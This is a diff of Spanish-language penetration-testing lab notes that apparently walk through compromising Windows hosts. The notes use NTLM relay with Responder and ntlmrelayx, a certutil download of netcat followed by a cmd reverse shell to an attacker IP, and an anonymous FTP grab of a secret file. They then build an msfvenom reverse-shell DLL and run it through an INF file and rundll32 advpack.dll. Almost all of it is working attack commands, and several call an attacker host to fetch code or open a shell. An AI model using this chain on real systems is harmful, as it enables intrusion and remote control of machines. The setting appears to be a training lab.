@@ -12,12 +12,53 @@ john -w pass.txt hash --format=NT
 pero no funciona, al parecer han usado contraseñas robustas.
 
 Probamos a ejecutar un comando en la maquina:
-    - Nos descargamos lo siguiente: git clone https://github.com/samratashok/nishang.git, en este repositorio encontraremos cosas muy interesantes.
-    - Nos copiamos un archivo a nuestro directorio de trabajo: cp ./nishang/Shells/Invoke-PowerShellTcp.ps1 .PS.ps1
-    - Abrimos el archivo, y al final de este ponemos lo siguiente: Invoke-PowerShellTcp -Reverse -IPAddress nustra_IP -Port 4646, esto en una reverse shell y el comando esta en el propio archivo.
+    - Creamos nc.ps1 con las siguientes dos lineas:
+        certutil -urlcache -split -f http://192.168.56.1:8000/nc.exe C:\nc.exe
+        C:\nc.exe 192.168.56.1 443 -e cmd
+    
     - nc -lvp 4646
     - python3 -m http.server, este comando lo ejecutamos en el mismo directorio k el archivo de nishang
     - nano /etc/responder/responder.conf -> Smb y http a Off, acordarse de dejarlo en On al terminar
     - sudo responder -I vboxnet0 -dw
-    - ntlmrelayx.py -tf ips.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/PS.ps1')"
+    IMPORTANTE: hacer el ntlmrelayx.py el ultimo comando, porque sino falla. Y si te conectas una vex y sales no puedes volver a conectarte, 
+    hay k reiniciar el entorno. 
+    - ntlmrelayx.py -tf ips.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/nc.ps1')"
     - Y al rato obtenemo una reverse shell en el nc -> Pass the Hash
+
+Una vez dentro:
+netstat -a 
+ftp IP, poner anonymous, enter y enter para dejar la contraseña vacia. Una vez dentro, ls, get secret.txt, quit, no alarmarse si no se ve nada por pantalla. Y una vez 
+se sale del ftp, ahcer type secret.txt
+Obtener creds de otro usuario y entrar por rdesktop
+
+La solucion esta en lolbas.
+
+(Avisar de poner path en .inf)
+
+Creo en .ddl.
+msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=192.168.56.1 LPORT=443 -f dll > evil.dll
+
+Lo subo a la maquina:
+python3 -m http.server
+curl http://IP:PORT/path/file.ddl
+
+Creo archivo .inf.
+Archivo inf:
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+ 
+[DefaultInstall_SingleUser]
+RegisterOCXs=RegisterOCXSection
+ 
+[RegisterOCXSection]
+C:\path\evil.dll
+ 
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="mantvydas"
+ShortSvcName="mantvydas"
+
+
+C:\Windows\System32\script.exe -ArgumentList 'advpack.dll,RegisterOCX evil.dll'
+rundll32.exe advpack.dll,RegisterOCX evil.dll
